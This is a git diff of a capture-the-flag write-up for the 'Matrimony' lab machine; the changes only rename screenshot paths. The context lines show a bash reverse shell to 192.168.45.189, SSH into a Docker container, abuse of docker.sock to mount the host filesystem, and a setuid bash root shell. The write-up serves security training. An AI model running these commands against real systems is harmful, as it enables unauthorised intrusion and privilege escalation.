@@ -22,7 +22,7 @@ DNS is open, so we likely need to find a domain name somewhere.
 
 Port 80 just shows us a static site:
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (8).png" alt=""><figcaption></figcaption></figure>
 
 There wasn't anything interesting about this site, so I went back to DNS. Similar to HTB, some machines from PGP tend to have domain names we just enter into our `/etc/hosts` file. I entered a few like `matrimony.pg`, `matrimony.offsec` and `matrimony.off`.
 
@@ -111,7 +111,7 @@ From here, we can easily get a reverse shell:
 $ bash -c 'bash -i >& /dev/tcp/192.168.45.189/21 0>&1'
 ```
 
-<figure><img src="../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (11) (8).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -132,7 +132,7 @@ docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
 
 We can `ssh` into 172.17.0.2 as `root`:
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
 
 We can find the `docker.sock` file in both machines:
 
@@ -156,10 +156,10 @@ We can mount back onto the first image:
 ./docker -H unix:///run/docker.sock run -it -v /:/mnt 73aebf20ceb1 bash
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (5).png" alt=""><figcaption></figcaption></figure>
 
 To get a `root` shell, simply run `chmod u+s /mnt/bin/bash`. Exit the docker container back onto the host machine and run `bash -p`:
 
-<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (4).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!
